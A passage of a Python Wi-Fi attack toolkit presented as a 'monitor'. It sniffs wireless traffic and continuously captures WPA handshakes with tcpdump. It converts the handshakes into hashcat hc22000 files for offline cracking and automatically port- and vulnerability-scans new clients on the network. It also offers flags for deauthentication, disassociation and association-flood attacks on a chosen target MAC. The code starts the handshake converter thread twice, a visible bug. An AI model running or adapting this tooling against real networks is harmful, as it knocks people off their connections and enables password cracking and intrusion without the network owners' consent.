        send_alert(f"High entropy traffic: {avg_entropy:.2f}")

    print_summary_sticky(total, unique_macs, avg_entropy, mgmt_ratio, stations, access_points, silent=silent)

# --- PyShark Enhancer ---
def enrich_with_pyshark(interface, duration=WINDOW_SEC):
    try:
        cap = pyshark.LiveCapture(interface=interface)
        cap.sniff(timeout=duration)
        subtype_map = []
        for pkt in cap:
            try:
                if "WLAN" in pkt:
                    fc_type = int(pkt.wlan.fc_type)
                    subtype = pkt.wlan.fc_type_subtype
                    if fc_type == 0:
                        frame_type = "mgmt"
                    elif fc_type == 1:
                        frame_type = "ctrl"
                    else:
                        frame_type = "data"
                    subtype_map.append((pkt.wlan.sa, frame_type, subtype))
            except Exception:
                continue
        return subtype_map
    except Exception:
        return []

# --- Monitor loop ---
def monitor(interface, silent=False):
    global packets_buffer
    load_oui_db()

    logging.info(f"Starting WiFi monitor on interface {interface}...")
    t = threading.Thread(target=lambda: sniff(iface=interface, prn=lambda pkt: scapy_handler(pkt, silent=silent), store=0), daemon=True)
    t.start()

    while True:
        time.sleep(WINDOW_SEC)
        df = pd.DataFrame(packets_buffer)
        subtype_info = enrich_with_pyshark(interface, duration=1)
        subtype_map = {src: (ftype, stype) for src, ftype, stype in subtype_info}
        if not df.empty:
            df["frame_type"] = df["src"].map(lambda x: subtype_map.get(x, ("unknown", None))[0])
            df["subtype"] = df["src"].map(lambda x: subtype_map.get(x, ("", "unknown"))[1])
        analyze_window(df, silent=silent)
        packets_buffer = []

# --- Handshake conversion ---
def handshake_converter_loop(handshake_pcap, output_dir, silent=False):
    os.makedirs(output_dir, exist_ok=True)
    last_size = 0
    while True:
        try:
            if not os.path.exists(handshake_pcap):
                time.sleep(5)
                continue
            current_size = os.path.getsize(handshake_pcap)
            if current_size > last_size:
                proc = subprocess.Popen([
                    "hcxpcapngtool",
                    "-o", output_dir,
                    handshake_pcap
                ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = proc.communicate()
                if proc.returncode == 0 and not silent:
                    logging.info(f"[+] Handshakes converted to {output_dir}")
                elif proc.returncode != 0:
                    logging.error(f"[!] hcxpcapngtool error: {stderr.decode()}")
                last_size = current_size
            time.sleep(5)
        except KeyboardInterrupt:
            logging.info("Handshake converter stopped")
            break
        except Exception as e:
            logging.error(f"Handshake converter error: {e}")
            time.sleep(5)

# --- Main ---
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    parser = argparse.ArgumentParser(description="All-in-one Wi-Fi monitor and network capture")
    parser.add_argument("--monitor-iface", type=str, default="wlan1mon",
                        help="Interface for Wi-Fi monitoring")
    parser.add_argument("--network-iface", type=str, default="wlan0",
                        help="Interface for network capture")
    parser.add_argument("--handshake-out", type=str, default="~/5t3wstuff/5t3whandshakes.pcap",
                        help="Path to save handshake .pcap")
    parser.add_argument("--capture-handshakes", action="store_true",
                        help="Enable continuous handshake capture")
    parser.add_argument("--network-out", type=str, default="~/5t3wstuff/5t3wnet.pcap",
                        help="Path to save network capture .pcap")
    parser.add_argument("--capture-network", action="store_true",
                        help="Enable continuous network capture")
    parser.add_argument("--silence", action="store_true",
                        help="Suppress terminal output")
    parser.add_argument("--hc22000-dir", type=str, default="~/5t3wstuff/5t3whc22000s/",
                        help="Folder to save hc22000 files")
    parser.add_argument("--port-scan", action="store_true",
                        help="Enable port scanning of new ARP clients")
    parser.add_argument("--scan-interval", type=int, default=30,
                        help="Interval in minutes for continuous port scanning (default: 30)")
    parser.add_argument("--scan-once", action="store_true",
                        help="Perform a single port scan and exit")
    parser.add_argument("--scan-reports-dir", type=str, default="~/5t3wstuff/5t3wportscans",
                        help="Directory to save port scan reports")
    parser.add_argument("--vuln-scan", action="store_true",
                        help="Enable vulnerability scanning of new ARP clients")
    parser.add_argument("--vuln-scan-interval", type=int, default=60,
                        help="Interval in minutes for continuous vulnerability scanning (default: 60)")
    parser.add_argument("--vuln-scan-once", action="store_true",
                        help="Perform a single vulnerability scan and exit")
    parser.add_argument("--vuln-reports-dir", type=str, default="~/5t3wstuff/5t3wvulns",
                        help="Directory to save vulnerability scan reports")
    parser.add_argument("--generate-vuln-report", action="store_true",
                        help="Generate vulnerability report from existing scan data and exit")
    parser.add_argument("--association-attack", action="store_true",
                        help="Enable WiFi association attacks (deauth, disassoc, etc.)")
    parser.add_argument("--attack-types", type=str, default="deauth",
                        help="Types of attacks to perform: deauth,disassoc,assoc_flood (comma-separated)")
    parser.add_argument("--attack-target", type=str,
                        help="Target MAC address for attacks")
    parser.add_argument("--attack-ap", type=str,
                        help="AP MAC address for attacks")
    parser.add_argument("--attack-ssid", type=str, default="",
                        help="SSID for association flood attacks")
    parser.add_argument("--attack-count", type=int, default=10,
                        help="Number of attack frames to send (default: 10)")
    parser.add_argument("--attack-interval", type=int, default=10,
                        help="Interval in minutes for continuous attacks (default: 10)")
    parser.add_argument("--attack-once", action="store_true",
                        help="Perform single attack and exit")
    parser.add_argument("--attack-logs-dir", type=str, default="~/5t3wstuff/5t3wattacks",
                        help="Directory to save attack logs")
    parser.add_argument("--tui", action="store_true",
                        help="Launch Terminal User Interface (TUI) mode")
    parser.add_argument("--tui-mode", type=str, choices=["dashboard", "stats", "targets", "interactive"], 
                        default="interactive", help="TUI mode to launch")
    args = parser.parse_args()

    if os.geteuid() != 0:
        logging.warning("[!] Root permissions recommended for packet capture")

    if args.silence:
        logging.getLogger().setLevel(logging.ERROR)

    # Handle TUI mode
    if args.tui:
        try:
            from tui import main_tui, run_tui_dashboard, display_quick_stats, display_targets
            import asyncio
            
            if args.tui_mode == "dashboard":
                logging.info("Starting TUI dashboard mode")
                asyncio.run(run_tui_dashboard())
            elif args.tui_mode == "stats":
                display_quick_stats()
            elif args.tui_mode == "targets":
                display_targets()
            elif args.tui_mode == "interactive":
                main_tui()
            # Removed invalid 'return' statement here
        except ImportError as e:
            logging.error(f"TUI dependencies not available: {e}")
            logging.error("Install with: pip install rich textual")
            exit(1)
        except Exception as e:
            logging.error(f"TUI error: {e}")
            exit(1)

    # Update global scan reports directory
    SCAN_REPORTS_DIR = args.scan_reports_dir
    SCANNED_IPS_FILE = os.path.join(SCAN_REPORTS_DIR, "scanned_ips.json")
    
    # Update global vulnerability reports directory
    VULN_REPORTS_DIR = args.vuln_reports_dir
    VULN_SCANNED_IPS_FILE = os.path.join(VULN_REPORTS_DIR, "vuln_scanned_ips.json")
    VULN_SUMMARY_FILE = os.path.join(VULN_REPORTS_DIR, "vulnerability_summary.json")
    
    # Update global association attack directory
    ASSOCIATION_ATTACK_DIR = args.attack_logs_dir
    ASSOCIATION_TARGETS_FILE = os.path.join(ASSOCIATION_ATTACK_DIR, "attack_targets.json")
    ASSOCIATION_LOGS_FILE = os.path.join(ASSOCIATION_ATTACK_DIR, "attack_logs.json")

    # Handle association attack modes
    if args.attack_once:
        if not args.association_attack:
            logging.error("--attack-once requires --association-attack flag")
            exit(1)
        
        attack_types = [t.strip() for t in args.attack_types.split(',')]
        logging.info("Performing single association attack...")
        
        success = run_association_attacks(
            args.monitor_iface,
            attack_types=attack_types,
            target_mac=args.attack_target,
            ap_mac=args.attack_ap,
            ssid=args.attack_ssid,
            count=args.attack_count
        )
        
        if success:
            logging.info("Association attack completed successfully, exiting.")
        else:
            logging.error("Association attack failed, exiting.")
        exit()

    # Handle vulnerability scanning modes
    if args.vuln_scan_once:
        logging.info("Performing single vulnerability scan...")
        scan_vulnerabilities()
        logging.info("Single vulnerability scan completed, exiting.")
        exit()
    
    if args.generate_vuln_report:
        logging.info("Generating vulnerability report...")
        report_file = generate_vulnerability_report()
        if report_file:
            logging.info(f"Vulnerability report saved to: {report_file}")
        logging.info("Report generation completed, exiting.")
        exit()

    # Handle port scanning modes
    if args.scan_once:
        logging.info("Performing single port scan...")
        scan_new_clients()
        logging.info("Single port scan completed, exiting.")
        exit()
    
    if args.vuln_scan:
        logging.info(f"Starting continuous vulnerability scanning with {args.vuln_scan_interval} minute intervals")
        t_vuln_scan = threading.Thread(target=continuous_vulnerability_scanning, 
                                       args=(args.vuln_scan_interval,), daemon=True)
        t_vuln_scan.start()
    
    if args.association_attack:
        attack_types = [t.strip() for t in args.attack_types.split(',')]
        logging.info(f"Starting continuous association attacks with {args.attack_interval} minute intervals")
        t_assoc_attack = threading.Thread(target=continuous_association_attacks,
                                         args=(args.monitor_iface, args.attack_interval, attack_types), daemon=True)
        t_assoc_attack.start()
    
    if args.port_scan:
        logging.info(f"Starting continuous port scanning with {args.scan_interval} minute intervals")
        t_port_scan = threading.Thread(target=continuous_port_scanning, 
                                       args=(args.scan_interval,), daemon=True)
        t_port_scan.start()

    # --- Handshake capture with pruning ---
    HANDSHAKE_MAX_SIZE_MB = 100  # max .pcap size before prune

    if args.capture_handshakes:
        def handshake_capture_prune():
            while True:
                try:
                    # prune if file too large
                    if os.path.exists(args.handshake_out):
                        size_mb = os.path.getsize(args.handshake_out) / (1024 * 1024)
                        if size_mb > HANDSHAKE_MAX_SIZE_MB:
                            backup_file = args.handshake_out + f".old.{int(time.time())}"
                            os.rename(args.handshake_out, backup_file)
                            logging.info(f"[!] Handshake file exceeded {HANDSHAKE_MAX_SIZE_MB}MB, rotated to {backup_file}")

                    proc = subprocess.Popen([
                        "tcpdump",
                        "-i", args.monitor_iface,
                        "-w", args.handshake_out,
                        "ether proto 0x888e"
                    ])
                    proc.wait()
                    logging.warning("tcpdump handshake capture exited, restarting in 5s...")
                    time.sleep(5)
                except KeyboardInterrupt:
                    logging.info("Handshake capture stopped")
                    break
                except Exception as e:
                    logging.error(f"Handshake capture error: {e}")
                    time.sleep(5)

        t_hs = threading.Thread(target=handshake_capture_prune, daemon=True)
        t_hs.start()
        logging.info(f"[*] Continuous handshake capture with pruning started on {args.monitor_iface}")

    # Handshake converter thread stays the same
    t_hc = threading.Thread(target=handshake_converter_loop,
                            args=(args.handshake_out, args.hc22000_dir, args.silence),
                            daemon=True)
    t_hc.start()
    logging.info(f"[*] Handshake converter started, saving hc22000 to {args.hc22000_dir}")

    # Handshake converter thread stays the same
    t_hc = threading.Thread(target=handshake_converter_loop,
                            args=(args.handshake_out, args.hc22000_dir, args.silence),
                            daemon=True)
    t_hc.start()
    logging.info(f"[*] Handshake converter started, saving hc22000 to {args.hc22000_dir}")

    # --- Network capture ---
    if args.capture_network:
        def network_capture():
            try:
                while True:
                    proc = subprocess.Popen([
                        "tcpdump",
                        "-i", args.network_iface,
                        "-w", args.network_out
                    ])
                    proc.wait()
                    logging.warning("tcpdump network capture exited, restarting in 5s...")
                    time.sleep(5)
            except KeyboardInterrupt:
                logging.info("Network capture stopped")
        t_net = threading.Thread(target=network_capture, daemon=True)
        t_net.start()
        logging.info(f"[*] Continuous network capture started on {args.network_iface}, saving to {args.network_out}")

    # --- Start Wi-Fi monitor ---
    monitor(interface=args.monitor_iface, silent=args.silence)
    
    # --- <3 ---
